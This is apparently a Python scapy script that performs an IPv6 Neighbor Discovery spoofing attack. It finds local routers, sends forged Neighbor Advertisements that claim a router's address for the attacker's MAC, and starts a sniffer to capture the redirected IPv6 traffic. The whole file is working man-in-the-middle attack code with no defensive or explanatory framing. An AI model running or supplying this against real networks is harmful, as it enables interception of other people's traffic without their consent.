import scapy
import netifaces
import threading
import time
import binascii
import netifaces as ni
import subprocess
from time import sleep
from scapy.all import *
from netifaces import AF_INET, AF_INET6, AF_LINK
from scapy.layers.inet6 import IPv6, ICMPv6ND_RS, ICMPv6ND_RA, ICMPv6ND_NS, ICMPv6ND_NA, ICMPv6NDOptSrcLLAddr
from scapy.all import *
from scapy.all import sr1, IP, ICMP


def sendNDP_NA(attacker_ipv6, attacker_mac, router_ip, interface):
    ether = Ether(src=attacker_mac, dst='33:33:00:00:00:02')
    base = IPv6(dst='ff02::2', src=router_ip[0])
    print(f"Sending NDP NS to {router_ip} from {attacker_ipv6}")
    ICMPv6NA = ICMPv6ND_NA(O=1, R=1, tgt=router_ip[0])
    src_ll_address = ICMPv6NDOptSrcLLAddr(lladdr=attacker_mac)
    packet = ether / base / ICMPv6NA / src_ll_address
    sendp(packet, iface=interface, verbose=0)
    pass


def packet_analyzer(packet):
    if IPv6 in packet:
        print("Packet captured:")
        print(f"{packet[IPv6].src} -> {packet[IPv6].dst}")


def filtered_ips(attacker_ipv6, output):
    ipv6_pattern = r'([0-9a-fA-F]{1,4}::[0-9a-fA-F:]+|[0-9a-fA-F:]+:[0-9a-fA-F]{1,4})'
    all_ipv6 = re.findall(ipv6_pattern, output)
    filtered_ip = list(set([ip for ip in all_ipv6 if str(ip) !=
                            str(attacker_ipv6) and str(ip) != str('ff02::2')]))
    return filtered_ip


def main():
    interface = "en0"
    attacker_ipv6 = ni.ifaddresses(interface)[AF_INET6][0]['addr']
    attacker_ipv6 = attacker_ipv6.split('%')[0]
    attacker_mac = ni.ifaddresses(interface)[ni.AF_LINK][0]['addr']
    print(f"Attacker IPv6: {attacker_ipv6}")
    print(f"Attacker MAC: {attacker_mac}")
    result = subprocess.run(
        ["ping6", '-c', '4', f'ff02::2%{interface}'], stdout=subprocess.PIPE)
    output = result.stdout.decode('utf-8')
    routers = filtered_ips(attacker_ipv6, output)
    print("Routers found:")
    print(routers)

    def sendNDP_NA_loop(attacker_ipv6, attacker_mac, router_ip, interface):
        while True:
            sendNDP_NA(attacker_ipv6, attacker_mac, router_ip, interface)
            time.sleep(1)
    ND_RA_thread = threading.Thread(target=sendNDP_NA, args=(
        attacker_ipv6, attacker_mac, routers, interface))
    ND_RA_thread.start()

    def startSniffer():
        sniff_filter = f"ip6 and dst host {attacker_ipv6}"
        sniff(iface=interface, filter=sniff_filter, prn=packet_analyzer)
        pass

    sniffer_thread = threading.Thread(target=startSniffer)
    sniffer_thread.start()


main()
